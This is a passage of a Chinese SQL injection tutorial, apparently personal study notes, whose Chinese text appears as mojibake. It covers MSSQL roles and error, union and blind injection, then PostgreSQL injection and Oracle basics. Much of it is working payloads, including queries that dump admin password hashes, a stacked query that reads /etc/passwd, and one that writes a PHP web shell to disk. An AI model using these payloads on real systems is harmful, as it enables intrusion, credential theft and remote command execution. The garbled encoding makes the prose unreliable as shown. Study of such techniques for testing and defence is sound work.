æ”¹æŸ¥å’ŒMySQLæ•°æ®åº“å¤§åŒå°å¼‚ï¼Œå…·ä½“å¯ä»¥è‡ªè¡Œw3cã€‚ 2.3 ä¿¡æ¯æœé›† å…ˆæ¥äº†è§£ä¸‹mssqlä¸­æœ‰å“ªäº›è§’è‰²/æƒé™ ä»¥ä¸‹æ‘˜è‡ªå®˜ç½‘æ–‡æ¡£ è¿™é‡Œç•™ç€æ—¥åæœ‰éœ€è¦åœ¨æŸ¥çœ‹ï¼Œè„‘å­é‡Œæœ‰ä¸ªå¤§æ¦‚å°è±¡ æœåŠ¡å™¨çº§çš„å›ºå®šè§’è‰² æè¿° sysadmin sysadmin å›ºå®šæœåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»ä½•æ´»åŠ¨ã€‚ serveradmin serveradmin å›ºå®šæœåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥æ›´æ”¹æœåŠ¡å™¨èŒƒå›´çš„é…ç½®é€‰é¡¹å’Œå…³é—­æœåŠ¡å™¨ã€‚ securityadmin securityadmin å›ºå®šæœåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥ç®¡ç†ç™»å½•ååŠå…¶å±æ€§ã€‚ ä»–ä»¬å¯ä»¥ GRANTã€DENY å’Œ REVOKE æœåŠ¡å™¨çº§æƒé™ã€‚ ä»–ä»¬è¿˜å¯ä»¥ GRANTã€DENY å’Œ REVOKE æ•°æ®åº“çº§æƒé™ï¼ˆå¦‚æœä»–ä»¬å…·æœ‰æ•°æ®åº“çš„è®¿é—®æƒé™ï¼‰ã€‚ æ­¤å¤–ï¼Œä»–ä»¬è¿˜å¯ä»¥é‡ç½® SQL Server ç™»å½•åçš„å¯†ç ã€‚ é‡è¦è¯´æ˜ï¼š å¦‚æœèƒ½å¤Ÿæˆäºˆå¯¹ æ•°æ®åº“å¼•æ“ çš„è®¿é—®æƒé™å’Œé…ç½®ç”¨æˆ·æƒé™ï¼Œå®‰å…¨ç®¡ç†å‘˜å¯ä»¥åˆ†é…å¤§å¤šæ•°æœåŠ¡å™¨æƒé™ã€‚ securityadmin è§’è‰²åº”è§†ä¸ºä¸ sysadmin è§’è‰²ç­‰æ•ˆã€‚ processadmin processadmin å›ºå®šæœåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥ç»ˆæ­¢åœ¨ SQL Server å®ä¾‹ä¸­è¿è¡Œçš„è¿›ç¨‹ã€‚ setupadmin setupadmin å›ºå®šæœåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥ä½¿ç”¨ Transact-SQL è¯­å¥æ·»åŠ å’Œåˆ é™¤é“¾æ¥æœåŠ¡å™¨ã€‚ ï¼ˆä½¿ç”¨ Management Studio æ—¶éœ€è¦ sysadmin æˆå‘˜èµ„æ ¼ã€‚ï¼‰ bulkadmin bulkadmin å›ºå®šæœåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥è¿è¡Œ BULK INSERT è¯­å¥ã€‚ diskadmin diskadmin å›ºå®šæœåŠ¡å™¨è§’è‰²ç”¨äºç®¡ç†ç£ç›˜æ–‡ä»¶ã€‚ dbcreator dbeator å›ºåŠ¡å™¨è§’è‰²çš„æˆå‘˜å¯ä»¥åˆ›å»ºã€æ›´æ”¹ã€åˆ é™¤å’Œè¿˜åŸä»»ä½•æ•°æ®åº“ã€‚ puic æ¯ä¸ª SQL Server ç™»å½•åéƒ½å±äº public æœåŠ¡å™¨è§’è‰²ã€‚ å¦‚æœæœªå‘æŸä¸ªæœåŠ¡å™¨ä¸»ä½“æˆäºˆæˆ–æ‹’ç»å¯¹æŸä¸ªå®‰å…¨å¯¹è±¡çš„ç‰¹å®šæƒé™ï¼Œè¯¥ç”¨æˆ·å°†ç»§æ‰¿æˆäºˆè¯¥å¯¹è±¡çš„ public è§’è‰²çš„æƒé™ã€‚ åªæœ‰åœ¨å¸Œæœ›æ‰€æœ‰ç”¨æˆ·éƒ½èƒ½ä½¿ç”¨å¯¹è±¡æ—¶ï¼Œæ‰åœ¨å¯¹è±¡ä¸Šåˆ†é… Public æƒé™ã€‚ ä½ æ— æ³•æ›´æ”¹å…·æœ‰ Public è§’è‰²çš„æˆå‘˜èº«ä»½ã€‚ æ³¨æ„plic ä¸å…¶ä»–è§’è‰²çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¯é€šè¿‡ public å›ºå®šæœåŠ¡å™¨è§’è‰²æˆäºˆã€æ‹’ç»æˆ–è°ƒç”¨æƒé™ã€‚ å›ºå®šæ•°æ®åº“è§’è‰²å æè¿° db_owner db_owner å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥æ‰§è¡Œæ•°æ®åº“çš„æ‰€æœ‰é…ç½®å’Œç»´æŠ¤æ´»åŠ¨ï¼Œè¿˜å¯ä»¥åˆ é™¤ SQL Serverä¸­çš„æ•°æ®åº“ã€‚ ï¼ˆåœ¨ SQL æ•°æ®åº“ å’Œ SQL æ•°æ®ä»“åº“ä¸­ï¼ŒæŸäº›ç»´æŠ¤æ´»åŠ¨éœ€è¦æœåŠ¡å™¨çº§åˆ«æƒé™ï¼Œå¹¶ä¸”ä¸èƒ½ç”± db_ownersæ‰§è¡Œã€‚ï¼‰ db_securityadmin db_securityadmin å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥ä»…ä¿®æ”¹è‡ªå®šä¹‰è§’è‰²çš„è§’è‰²æˆå‘˜èµ„æ ¼ã€åˆ›å»ºæ— ç™»å½•åçš„ç”¨æˆ·å’Œç®¡ç†æƒé™ã€‚ å‘æ­¤è§’è‰²ä¸­æ·»åŠ ä¸»ä½“å¯èƒ½ä¼šå¯¼è‡´æ„å¤–çš„æƒé™å‡çº§ã€‚ db_accessadmin db_accessadmin å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥ä¸º Windows ç™»å½•åã€Windows ç»„å’Œ SQL Server ç™»å½•åæ·»åŠ æˆ–åˆ é™¤æ•°æ®åº“è®¿é—®æƒé™ã€‚ db_backupoperator db_backupoperator å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥å¤‡ä»½æ•°æ®åº“ã€‚ db_ddladmin db_ddladmin å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥åœ¨æ•°æ®åº“ä¸­è¿è¡Œä»»ä½•æ•°æ®å®šä¹‰è¯­è¨€ (DDL) å‘½ä»¤ã€‚ db_datawriter db_datawriter å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥åœ¨æ‰€æœ‰ç”¨æˆ·è¡¨ä¸­æ·»åŠ ã€åˆ é™¤æˆ–æ›´æ”¹æ•°æ®ã€‚ db_datareader db_datareader å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜å¯ä»¥ä»æ‰€æœ‰ç”¨æˆ·è¡¨ä¸­è¯»å–æ‰€æœ‰æ•°æ®ã€‚ db_denydatawriter db_denydatawriter å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜ä¸èƒ½æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤æ•°æ®åº“å†…ç”¨æˆ·è¡¨ä¸­çš„ä»»ä½•æ•°æ®ã€‚ db_denydatareader db_denydatareader å›ºå®šæ•°æ®åº“è§’è‰²çš„æˆå‘˜ä¸èƒ½è¯»å–æ•°æ®åº“å†…ç”¨æˆ·è¡¨ä¸­çš„ä»»ä½•æ•°æ®ã€‚ æˆ‘ä»¬å¯ä»¥ç”¨IS_SRVROLEMEMBERæ¥åˆ¤æ–­æœåŠ¡å™¨çº§åˆ«çš„å›ºå®šè§’è‰² è¿”å›å€¼ æè¿° 0 login ä¸æ˜¯ role çš„æˆå‘˜ã€‚ 1 login æ˜¯ role çš„æˆå‘˜ã€‚ NULL role æˆ– login æ— æ•ˆï¼Œæˆ–è€…æ²¡æœ‰æŸ¥çœ‹è§’è‰²æˆå‘˜èº«ä»½çš„æƒé™ã€‚ æ„é€ è¯­å¥ and 1=(select is_srvrolemember('sysadmin')) and 1=(select is_srvrolemember('serveradmin')) and 1=(select is_srvrolemember('setupadmin')) and 1=(select is_srvrolemember('securityadmin')) and 1=(select is_srvrolemember('diskadmin')) and 1=(select is_srvrolemember('bulkadmin')) æ•°æ®åº“çº§åˆ«çš„åº”ç”¨è§’è‰²ç”¨IS_MEMBERå‡½æ•°åˆ¤æ–­ SELECT IS_MEMBER('db_owner') å†æ¥çœ‹ä¸€äº›åŸºæœ¬ä¿¡æ¯ SELECT @@version; //ç‰ˆæœ¬ SELECT user; //ç”¨æˆ· SELECT DB_NAME();\t//å½“å‰æ•°æ®åº“åï¼Œä½ å¯ä»¥ç”¨db_name(n)æ¥éå†å‡ºæ‰€æœ‰çš„æ•°æ®åº“ SELECT @@servername;\t//ä¸»æœºå é‚£ä¹ˆç«™åº“åˆ†ç¦»å¯ä»¥è¿™ä¹ˆæ¥åˆ¤æ–­ select * from user where id='1'and host_name()=@@servername;--' 2.4 ç¬¦å· æ³¨é‡Šç¬¦ /* -- ;%00 ç©ºç™½ç¬¦å· 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20\t--æš‚æ—¶ä¸äº†è§£ä¸ºä»€ä¹ˆ /**/ è¿ç®— --åŸºæœ¬çš„ä¸åˆ—ä¸¾äº†ï¼Œä¸¾å‡ ä¸ªç‰¹æ®Šçš„ ALL å¦‚æœä¸€ç»„çš„æ¯”è¾ƒéƒ½ä¸ºtrueï¼Œåˆ™æ¯”è¾ƒç»“æœä¸ºtrue AND å¦‚æœä¸¤ä¸ªå¸ƒå°”è¡¨è¾¾å¼éƒ½ä¸ºtrueï¼Œåˆ™ç»“æœä¸ºtrueï¼›å¦‚æœå…¶ä¸­ä¸€ä¸ªè¡¨è¾¾å¼ä¸ºfalseï¼Œåˆ™ç»“æœä¸ºfalse ANY å¦‚æœä¸€ç»„çš„æ¯”è¾ƒä¸­ä»»ä½•ä¸€ä¸ªä¸ºtrueï¼Œåˆ™ç»“æœä¸ºtrue BETWEEN å¦‚æœæ“ä½œæ•°åœ¨æŸä¸ªèŒƒå›´ä¹‹å†…ï¼Œé‚£ä¹ˆç»“æœä¸ºtrue EXISTS å¦‚æœå­æŸ¥è¯¢ä¸­åŒ…å«äº†ä¸€äº›è¡Œï¼Œé‚£ä¹ˆç»“æœä¸ºtrue IN å¦‚æœæ“ä½œæ•°ç­‰äºè¡¨è¾¾å¼åˆ—è¡¨ä¸­çš„ä¸€ä¸ªï¼Œé‚£ä¹ˆç»“æœä¸ºtrue LIKE å¦‚æœæ“ä½œæ•°ä¸æŸç§æ¨¡å¼ç›¸åŒ¹é…ï¼Œé‚£ä¹ˆç»“æœä¸ºtrue NOT å¯¹ä»»ä½•å…¶ä»–å¸ƒå°”è¿ç®—ç¬¦çš„ç»“æœå€¼å–å OR å¦‚æœä¸¤ä¸ªå¸ƒå°”è¡¨è¾¾å¼ä¸­çš„ä»»ä½•ä¸€ä¸ªä¸ºtrueï¼Œé‚£ä¹ˆç»“æœä¸ºtrue SOME å¦‚æœåœ¨ä¸€ç»„æ¯”è¾ƒä¸­ï¼Œæœ‰äº›æ¯”è¾ƒä¸ºtrueï¼Œé‚£ä¹ˆç»“æœä¸ºtrue 2.5 åŸºæœ¬æ³¨å…¥æµç¨‹ æ­¤å¤„åˆ©ç”¨mssqlæ•°æ®ç±»å‹ä¸ä¸€æ ·æ¯”è¾ƒæŠ¥é”™ï¼Œçˆ†å‡ºå½“å‰æ•°æ®åº“å SELECT * FROM Fanmv_Admin WHERE AdminID=1 and DB_NAME()&gt;1; åœ¨å°† nvarchar å€¼ â€˜FanmvCMSâ€™ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚ çˆ†è¡¨å SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 name from sysobjects WHERE xtype='u'); åœ¨å°† nvarchar å€¼ â€˜Fanmv_Adminâ€™ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚ æ­¤å¤„xtypeå¯ä»¥æ˜¯ä¸‹åˆ—å¯¹è±¡ç±»å‹ä¸­çš„ä¸€ç§ï¼š ç¼©å†™ å…¨ç§° C CHECK çº¦æŸ D é»˜è®¤å€¼æˆ– DEFAULT çº¦æŸ F FOREIGN KEY çº¦æŸ L æ—¥å¿— FN æ ‡é‡å‡½æ•° IF å†…åµŒè¡¨å‡½æ•° P å­˜å‚¨è¿‡ç¨‹ PK PRIMARY KEY çº¦æŸï¼ˆç±»å‹æ˜¯ Kï¼‰ RF å¤åˆ¶ç­›é€‰å­˜å‚¨è¿‡ç¨‹ S ç³»ç»Ÿè¡¨ TF è¡¨å‡½æ•° TR è§¦å‘å™¨ U ç”¨æˆ·è¡¨ UQ UNIQUE çº¦æŸï¼ˆç±»å‹æ˜¯ Kï¼‰ V è§†å›¾ X æ‰©å±•å­˜å‚¨è¿‡ç¨‹ æ­¤å¤„çš„sysobjectsç­‰åŒäº[master].[sys].[objects] çˆ†åˆ—å SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = 'Fanmv_Admin')); åœ¨å°† nvarchar å€¼ â€˜AdminIDâ€™ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚ [22018] [Microsoft][SQL Server Native Client 10.0][SQL Server]åœ¨å°† nvarchar å€¼ â€˜AdminIDâ€™ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚ (245) çˆ†æ•°æ® SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 AdminPass from Fanmv_Admin); åœ¨å°† varchar å€¼ â€˜81FAAEN52MA16VBYT4Y1JJ3552BTC1640E7CF84345C86BA6â€™ è½¬æ¢æˆæ•°æ®ç±»å‹ int æ—¶å¤±è´¥ã€‚ å½“ç„¶ï¼Œåœ¨mssqlä¸­ä¹Ÿå­˜åœ¨INFORMATION_SCHEMAï¼Œä½ ä¹Ÿå¯ä»¥é€šè¿‡å®ƒæ¥æŸ¥è¯¢ã€‚ select * from INFORMATION_SCHEMA.TABLES select * from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME='admin' and 1=(select top 1 table_name from information_schema.tables);-- åˆ¤æ–­è¡¨åæ›´æ–¹ä¾¿çš„ä¸€ç§æ–¹å¼æ˜¯ä½¿ç”¨having 1=1ï¼ŒGROUP BY SELECT * FROM Fanmv_Admin WHERE AdminID=1 having 1=1 é€‰æ‹©åˆ—è¡¨ä¸­çš„åˆ— â€˜Fanmv_Admin.AdminIDâ€™ æ— æ•ˆï¼Œå› ä¸ºè¯¥åˆ—æ²¡æœ‰åŒ…å«åœ¨èšåˆå‡½æ•°æˆ– GROUP BY å­å¥ä¸­ã€‚ çˆ†å‡ºä¸€åˆ—ï¼Œå°†å…¶ç”¨group by æ‹¼æ¥è¿›å»ç»§ç»­å¾€åçˆ†å…¶ä»–çš„ SELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID having 1=1 é€‰æ‹©åˆ—è¡¨ä¸­çš„åˆ— â€˜Fanmv_Admin.IsSystemâ€™ æ— æ•ˆï¼Œå› ä¸ºè¯¥åˆ—æ²¡æœ‰åŒ…å«åœ¨èšåˆå‡½æ•°æˆ– GROUP BY å­å¥ä¸­ã€‚ SELECT * FROM Fanmv_Admin WHERE AdminID=1 GROUP BY AdminID,IsSystem having 1=1 é€‰æ‹©åˆ—è¡¨ä¸­çš„åˆ— â€˜Fanmv_Admin.AdminNameâ€™ æ— æ•ˆï¼Œå› ä¸ºè¯¥åˆ—æ²¡æœ‰åŒ…å«åœ¨èšåˆå‡½æ•°æˆ– GROUP BY å­å¥ä¸­ã€‚ ä»¥æ­¤çˆ†å‡ºæ‰€æœ‰å­—æ®µ 2.6 æŠ¥é”™æ³¨å…¥ å…¶å®åŸºæœ¬æ³¨å…¥æµç¨‹ä¸­ç”¨åˆ°çš„å°±æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œmssqlä¸­æ²¡æœ‰æŠ¥é”™å‡½æ•°ï¼ŒæŠ¥é”™æ³¨å…¥åˆ©ç”¨çš„å°±æ˜¯æ˜¾å¼æˆ–éšå¼çš„ç±»å‹è½¬æ¢æ¥æŠ¥é”™ å…ˆæ¥çœ‹éšå¼æŠ¥é”™ select * from admin where id =1 and (select user)&gt;0 userå’Œ0è¿›è¡Œæ¯”è¾ƒæ—¶å°±ä¼šæŠ¥é”™ å†æ¥çœ‹æ˜¾ç¤ºæŠ¥é”™ï¼Œä¸€èˆ¬ä¸Šæ˜¾ç¤ºæŠ¥é”™ç”¨åˆ°çš„æ˜¯castå’Œconvertå‡½æ•° select * from admin where id =1 (select CAST(USER as int)) select * from admin where id =1 (select convert(int,user)) è¿™é‡Œå†æ¥å¼•å…¥ä¸€ä¸ªdeclare select * from admin where id =1;declare @a varchar(2000) set @a='select convert(int,user)' exec(@a); declareå®šä¹‰å˜é‡ setèµ‹å€¼execæ‰§è¡Œ 2.7 è”åˆæŸ¥è¯¢æ³¨å…¥ mssqlä¸ç”¨æ•°å­—å ä½ï¼Œå› ä¸ºå¯èƒ½ä¼šå‘ç”Ÿéšå¼è½¬æ¢ï¼Œæˆ‘ä»¬ç”¨nullæ¥å ä½ï¼Œå› ä¸ºmssqlæ•°æ®åº“æ˜¯ä¸ªå¼ºç±»å‹çš„æ•°æ®åº“ï¼Œå¯¹æ•°æ®æ ¼å¼æ¯”è¾ƒä¸¥æ ¼ã€‚ ï¼ˆè¿™é‡Œä¹Ÿæ˜¯æ²¡ææ‡‚å‘ç”Ÿéšå¼è½¬æ¢ä¼šå¦‚ä½•ï¼Œæˆ‘çŒœæµ‹æ˜¯è½¬æ¢åæ— æ³•æŸ¥è¯¢æˆ‘ä»¬æƒ³è®©å…¶æŸ¥è¯¢çš„è¯­å¥äº†ï¼‰ SELECT * from users where id=1 union select null,null,DB_NAME(); ä½ ä¹Ÿå¯ä»¥è¿™æ ·æ¥è”åˆæŠ¥é”™ SELECT * from users where id=1 union select null,null, (select CAST(db_name() as int)) 2.8 å¸ƒå°”ç›²æ³¨ SELECT * from users where id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1))=109 å¸ƒå°”ç›²æ³¨æ²¡æœ‰mysqlé‚£ä¹ˆå¤šå§¿åŠ¿ï¼Œå¤§åŒå°å¼‚æˆªå–å­—ç¬¦ä¸²æ¯”è¾ƒ 2.9 æ—¶é—´ç›²æ³¨ SELECT * from users where id=1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5' waitfor delay '0:0:5'æ˜¯mssqlçš„å»¶æ—¶è¯­æ³• åŒæ ·å¯ä»¥ç”¨å­—ç¬¦ä¸²æˆªå–æ¥å»¶æ—¶æ³¨å…¥ select * from users where id=1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY '0:0:5' 0x03 PostgreSQL 3.1 ç¯å¢ƒæ­å»º è¿™é‡Œæ¯”è¾ƒå»ºè®®ç”¨dockeræ­å»ºï¼ˆå¦‚æœä¸èµ¶æ—¶é—´çš„è¯ï¼‰ï¼Œæˆ‘è¿™é‡Œä¹Ÿæ˜¯æ‡’å¾—æ­å»ºäº†ï¼Œä¾æ—§æ˜¯è·Ÿç€æ–‡ç« èµ°ä¸€é 3.2 éªŒè¯æ³¨å…¥ index.php?uid=1 AND 1=1 è¿è¡Œæ­£å¸¸ index.php?uid=1 AND 1=2 è¿è¡Œå¼‚å¸¸ 3.3 æŠ¥é”™æ³¨å…¥ è¿™é‡Œä¹Ÿæ²¡å»æŸ¥ï¼ŒçŒœæµ‹æ˜¯castå‡½æ•°å°†selectæŸ¥è¯¢å‡ºçš„æ•°æ®è½¬æ¢ä¸ºäº†asè¯­å¥åé¢çš„numericæ•°å­—å‹ï¼Œå¯¼è‡´æŠ¥é”™ è·å–ç‰ˆæœ¬å·ï¼š select * from tbuser where id=1 AND 7778=CAST((SELECT version())::text AS NUMERIC) è·å– Schemas åç§° select * from tbuser where id=1 AND 7778=CAST((SELECT schemaname FROM pg_tables limit 1)::text AS NUMERIC) 3.4 æ—¶é—´ç›²æ³¨ AND 6489=(SELECT 6489 FROM PG_SLEEP(5)) //å»¶æ—¶ 5 ç§’ 3.5 å †å æ³¨å…¥ ï¼ˆå¤šè¯­å¥æŸ¥è¯¢ï¼Œstacked queriesï¼‰ ?uid=1;select PG_SLEEP(5)-- 3.6 è”åˆæ³¨å…¥ ?uid=1 order by 1,2,3 è¿è¡Œæ­£å¸¸ ?uid=1 order by 1,2,3,4 è¿è¡Œå¼‚å¸¸ï¼Œè·å–å­—æ®µæ•° 3 ?uid=1 UNION ALL SELECT NULL,('11111'),NULL-- æŸ¥çœ‹æ˜¯å¦è¾“å‡º 11111 è¿™é‡Œä¾æ—§æ˜¯NULLè€Œä¸ç”¨æ•°å­—å ç”¨ è·å–æ•°æ®åº“ç»“æ„å’Œå†…å®¹ï¼Œæ­¤å¤„å‡ä¸ºè”åˆæŸ¥è¯¢ è·å–æ¨¡å¼åç§°ï¼ˆschemanameï¼‰åç§° ?uid=1 UNION SELECT NULL,COALESCE(CAST(schemaname AS CHARACTER(10000)),(CHR(32))),NULL FROM pg_tables-- è¯­æ³•è§£æï¼š COALESCE(expression[,n]) coalesce å‡½æ•°è¿”å›å‚æ•°ï¼ˆåˆ—åï¼‰ä¸­ç¬¬ä¸€ä¸ªé NULL å€¼çš„å­—æ®µå€¼ï¼Œæ³¨æ„ä¸æ˜¯ä¸ºç©º'' cast ('1' as numeric) 1 è½¬æ¢ä¸ºæ•°å­—ç±»å‹ ç®€åŒ–ï¼š ?uid=1 UNION SELECT NULL,schemaname,NULL FROM pg_tables-- ç”¨æˆ·åˆ›å»ºçš„æ•°æ®åº“é»˜è®¤æ¨¡å¼åç§°ï¼ˆschemanameï¼‰ä¸º public è·å–æ•°æ®è¡¨åç§° uid=1 UNION ALL SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname IN ('public') è·å–è¡¨å­—æ®µåç§° ?uid=1 UNION SELECT NULL,attname,NULL FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum&gt;0 AND a.relname='tbuser' AND nspname='public'â€” è·å–è¡¨å†…å®¹ ?uid=1 UNION ALL SELECT NULL,id||','||username||','||passwd,NULL FROM public.tbuser-- æµ‹åˆ—æ•°ï¼š order by 4 and 1=2 union select null,null,null,null æµ‹æ˜¾ä½ï¼šç¬¬ 2ï¼Œ3 and 1=2 union select 'null',null,null,null é”™è¯¯ and 1=2 union select null,'null',null,null æ­£å¸¸ and 1=2 union select null,null,'null',null æ­£å¸¸ and 1=2 union select null,null,null,'null' é”™è¯¯ è·å–ä¿¡æ¯ï¼š and 1=2 UNION SELECT null,version(),null,null and 1=2 UNION SELECT null,current_user,null,null and 1=2 union select null,current_database(),null,null è·å–æ•°æ®åº“åï¼š and 1=2 union select null,string_agg(datname,','),null,null from pg_database è·å–è¡¨åï¼š 1ã€and 1=2 union select null,string_agg(tablename,','),null,null from pg_tables where schemaname='public' 2ã€and 1=2 union select null,string_agg(relname,','),null,null from pg_stat_user_tables è·å–åˆ—åï¼š and 1=2 union select null,string_agg(column_name,','),null,null from information_schema.columns where table_name='reg_users' è·å–æ•°æ®ï¼š and 1=2 union select null,string_agg(username,',')from reg_users 3.7 æ–‡ä»¶æˆ–ç›®å½•æ“ä½œ PostgreSQL ä¸­éƒ¨åˆ†å†…ç½®å‡½æ•°ã€è¡¨ åˆ—ç›®å½•â€”â€”åªèƒ½åˆ—å®‰è£…ç›®å½•ä¸‹çš„æ–‡ä»¶ ?uid=1 union select NULL,NULL,pg_ls_dir('./') è¯»æ–‡ä»¶ è¿™é‡Œæ˜¯å †å æ³¨å…¥ï¼Œæ³¨æ„åˆ†å· ?uid=1;CREATE TABLE passwd(t TEXT);COPY passwd FROM '/etc/passwd';SELECT NULL,t,NULL FROM passwd; å°†è¦æŸ¥è¯¢çš„æ•°æ®æ”¾è¿›äº†æ–°å»ºçš„tè¡¨ï¼Œå¹¶æœ€ç»ˆè¯»å– å†™æ–‡ä»¶ ?uid=1;DROP TABLE pass;ï¼ˆè¿™é‡Œéœ€è¦ä¸ºæ•°æ®åº“å­˜åœ¨çš„è¡¨ï¼‰CREATE TABLE hacktb (t TEXT);INSERT INTO hacktb(t) VALUES ('&lt;?php @system(\"$_GET[cmd]\");?&gt;');COPY hacktb(t) TO '/tmp/hack.php'; 0x04 Oracle 4.1 åŸºæœ¬æ¦‚å¿µ Oracleå’ŒMySQLæ•°æ®åº“è¯­æ³•å¤§è‡´ç›¸åŒï¼Œç»“æ„ä¸å¤ªç›¸åŒã€‚æœ€å¤§çš„ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯oracleå¯ä»¥è°ƒç”¨Javaä»£ç ã€‚ å¯¹äºâ€œæ•°æ®åº“â€è¿™ä¸ªæ¦‚å¿µè€Œè¨€ï¼ŒOracleé‡‡ç”¨äº†â€è¡¨ç©ºé—´â€œçš„å®šä¹‰ã€‚æ•°æ®æ–‡ä»¶å°±æ˜¯ç”±å¤šä¸ªè¡¨ç©ºé—´ç»„æˆçš„ï¼Œè¿™äº›æ•°æ®æ–‡ä»¶å’Œç›¸å…³æ–‡ä»¶å½¢æˆä¸€ä¸ªå®Œæ•´çš„æ•°æ®åº“ã€‚å½“æ•°æ®åº“åˆ›å»ºæ—¶ï¼ŒOracle ä¼šé»˜è®¤åˆ›å»ºäº”ä¸ªè¡¨ç©ºé—´ï¼šSYSTEMã€SYSAUXã€USERSã€UNDOTBSã€TEMPï¼š SYSTEMï¼šçœ‹åå­—å°±çŸ¥é“è¿™ä¸ªç”¨äºæ˜¯å­˜å‚¨ç³»ç»Ÿè¡¨å’Œç®¡ç†é…ç½®ç­‰åŸºæœ¬ä¿¡æ¯ SYSAUXï¼šç±»ä¼¼äº SYSTEMï¼Œä¸»è¦å­˜æ”¾ä¸€äº›ç³»ç»Ÿé™„åŠ ä¿¡æ¯ï¼Œä»¥ä¾¿å‡è½» SYSTEM çš„ç©ºé—´è´Ÿæ‹… UNDOTBSï¼šç”¨äºäº‹åŠ¡å›é€€ç­‰ TEMPï¼šä½œä¸ºç¼“å­˜ç©ºé—´å‡å°‘å†…å­˜è´Ÿæ‹… USERSï¼šå°±æ˜¯å­˜å‚¨æˆ‘ä»¬å®šä¹‰çš„è¡¨å’Œæ•°æ® â€‹ åœ¨Oracleä¸­æ¯ä¸ªè¡¨ç©ºé—´ä¸­å‡å­˜åœ¨ä¸€å¼ dualè¡¨ï¼Œè¿™ä¸ªè¡¨æ˜¯è™šè¡¨ï¼Œå¹¶æ²¡æœ‰å®é™…çš„å­˜å‚¨æ„ä¹‰ï¼Œå®ƒæ°¸è¿œåªå­˜å‚¨ä¸€æ¡æ•°æ®ï¼Œå› ä¸ºOracleçš„SQLè¯­æ³•è¦æ±‚selectåå¿…é¡»è·Ÿä¸Šfromï¼Œæ‰€ä»¥æˆ‘ä»¬é€šå¸¸ä½¿ç”¨dualæ¥ä½œä¸ºè®¡ç®—ã€æŸ¥è¯¢æ—¶é—´ç­‰SQLè¯­å¥ä¸­fromä¹‹åçš„è™šè¡¨å ä½ï¼Œä¹Ÿå°±æ˜¯select 1+1 from dualã€‚ å†æ¥çœ‹Oracleä¸­ç”¨æˆ·å’Œæƒé™åˆ’åˆ†ï¼šOracle ä¸­åˆ’åˆ†äº†è®¸å¤šç”¨æˆ·æƒé™ï¼Œæƒé™çš„é›†åˆç§°ä¸ºè§’è‰²ã€‚ä¾‹å¦‚ CONNECT è§’è‰²å…·æœ‰è¿æ¥åˆ°æ•°æ®åº“æƒé™ï¼ŒRESOURCE èƒ½è¿›è¡ŒåŸºæœ¬çš„å¢åˆ æ”¹æŸ¥ï¼ŒDBA åˆ™é›†åˆäº†æ‰€æœ‰çš„ç”¨æˆ·æƒé™ã€‚åœ¨åˆ›å»ºæ•°æ®åº“æ—¶ï¼Œä¼šé»˜è®¤å¯ç”¨ sysã€system ç­‰ç”¨æˆ·ï¼š sysï¼šç›¸å½“äº Linux ä¸‹çš„ root ç”¨æˆ·ã€‚ä¸º DBA è§’è‰² systemï¼šä¸ sys ç±»ä¼¼ï¼Œä½†æ˜¯ç›¸å¯¹äº sys ç”¨æˆ·ï¼Œæ— æ³•ä¿®æ”¹ä¸€äº›å…³é”®çš„ç³»ç»Ÿæ•°æ®ï¼Œè¿™äº›æ•°æ®ç»´æŒç€æ•°æ®åº“çš„æ­£å¸¸è¿è¡Œã€‚ä¸º DBA è§’è‰²ã€‚ publicï¼špublic ä»£æŒ‡æ‰€æœ‰ç”¨æˆ·ï¼ˆeveryoneï¼‰ï¼Œå¯¹å…¶æ“ä½œä¼šåº”ç”¨åˆ°æ‰€æœ‰ç”¨æˆ·ä¸Šï¼ˆå®é™…ä¸Šæ˜¯æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰ public ç”¨æˆ·æ‹¥æœ‰çš„æƒé™ï¼Œå¦‚æœå°† DBA æƒé™ç»™äº† publicï¼Œé‚£ä¹ˆä¹Ÿå°±æ„å‘³ç€æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰äº† DBA æƒé™ï¼‰ 4.2 åŸºæœ¬è¯­æ³• 